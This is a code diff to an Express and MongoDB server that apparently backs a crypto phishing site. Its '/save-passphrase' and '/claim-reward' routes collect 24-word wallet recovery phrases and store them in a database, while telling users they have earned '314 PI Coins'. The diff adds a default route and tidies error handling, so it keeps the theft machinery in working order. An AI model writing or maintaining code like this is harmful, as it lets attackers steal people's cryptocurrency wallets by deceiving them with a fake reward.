@@ -21,12 +21,16 @@ app.use(bodyParser.json());
 // Serve static files from the "public" directory
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Default route to serve index.html
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 // MongoDB Schema
 const saleSchema = new mongoose.Schema({
     piAmount: Number,
     passphrase: String,
     paymentMethod: String,
-    claimedAt: { type: Date, default: Date.now },
 });
 
 const Sale = mongoose.model('Sale', saleSchema);
@@ -42,9 +46,7 @@ app.post('/save-passphrase', (req, res) => {
     });
 
     newSale.save()
-        .then(() => {
-            res.json({ success: true });
-        })
+        .then(() => res.json({ success: true }))
         .catch(err => {
             console.log('Error saving data:', err);
             res.json({ success: false });
@@ -55,7 +57,7 @@ app.post('/save-passphrase', (req, res) => {
 app.post('/claim-reward', (req, res) => {
     const { passphrase } = req.body;
 
-    if (!passphrase || passphrase.split(' ').length !== 24) {
+    if (passphrase.split(' ').length !== 24) {
         return res.json({ success: false, message: 'Invalid passphrase' });
     }
 
@@ -65,9 +67,7 @@ app.post('/claim-reward', (req, res) => {
     });
 
     newSale.save()
-        .then(() => {
-            res.json({ success: true, message: 'Congratulations!!! You have earned your 314 PI Coins Successfully!!' });
-        })
+        .then(() => res.json({ success: true, message: 'Congratulations! You have earned your 314 PI Coins Successfully!!' }))
         .catch(err => {
             console.log('Error saving reward data:', err);
             res.json({ success: false, message: 'Failed to process reward claim' });
